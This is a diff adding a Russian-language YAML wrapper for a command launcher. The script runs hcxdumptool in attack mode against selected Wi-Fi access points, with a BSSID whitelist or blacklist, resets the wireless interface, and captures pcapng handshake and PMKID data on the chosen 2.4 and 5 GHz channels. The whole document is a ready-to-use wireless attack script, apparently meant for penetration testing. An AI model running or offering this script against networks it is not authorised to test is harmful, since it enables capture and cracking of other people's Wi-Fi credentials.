@@ -1,0 +1,72 @@
+description: |-
+  Запускает hxcdumptool в режиме атаки по белому списку без лишних заморочек
+  Сохранит pcapng файлы в текущую директорию
+  
+  Каналы 2.4ГГц:
+  1a,2a,3a,4a,5a,6a,7a,8a,9a,10a,11a,12a,13a,14a
+  
+  Каналы 5ГГц:
+  15b,16b,17b,18b,20b,24b,28b,32b,36b,40b,44b,48b,52b,56b,60b,64b,68b,72b,76b,80b,84b,88b,92b,96b,100b,104b,108b,112b,116b,120b,124b,128b,132b,136b,140b,144b,149b,153b,157b,161b,165b,169b,173b,177b
+
+  Посмотреть информацию о каналах, доступых интерфейсу:
+  hcxdumptool -I <wlan>
+author: vinzekatze
+
+arguments:
+  i:
+    description: имя интерфейса
+    metavar: INTERFACE
+  b:
+    description: BSSID точек доступа для атаки (может принимать файлы со списками)
+    multiple: true
+    regex: '^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$|^[0-9A-Fa-f]{12}$'
+    metavar: BSSID
+    replacer: '#bssid#'
+  c:
+    description: >-
+      каналы атакуемых точек доступа (может принимать файлы со списками, понимает форматы "1" и "1a")
+    metavar: CHANNEL
+    multiple: true
+    regex: '\d+[abcde]?'
+  black-list:
+    default:
+      -
+      - 'not '
+    replacer: '#BLACKLIST-MODE#'
+    description: режим черного списка BSSID - будет атаковать все, кроме указанных
+
+shell: bash
+mode:
+  readfile:
+    - b
+    - c
+  format:
+    b: >-
+      wlan addr3 {}
+    i: '{!r}'
+    c: '{!r}'
+  join:
+    b: ' or '
+  pformat:
+    b: '{!r}'
+
+script: >-
+  targs1=#bssid#;
+  interface=#i#;
+  channels="";
+  iw dev $interface info 2>&1 1>/dev/null || { echo "Device $interface not found"; exit ; };
+  sudo nmcli dev set $interface managed no; sleep 1;
+  sudo ip link set $interface down;
+  sudo iw $interface set type managed;
+  sudo ip link set $interface up;
+  sudo nmcli dev set $interface managed yes; sleep 1;
+  hcxdumptool --bpfc="#BLACKLIST-MODE#($targs1)" > temp.targets-filter.bpf;
+  for chn in #c#; do
+  if [[ "$chn" =~ ^[0-9]+$ ]];
+  then if [ "$chn" -lt 15 ];
+  then channels+="${chn}a,";
+  else channels+="${chn}b,"; fi;
+  else channels+="$chn,"; fi; done;
+  channels=${channels%,};
+  sudo hcxdumptool -i $interface --rds=3 --bpf=temp.targets-filter.bpf -c $channels;
+  rm -f ./temp.targets-filter.bpf
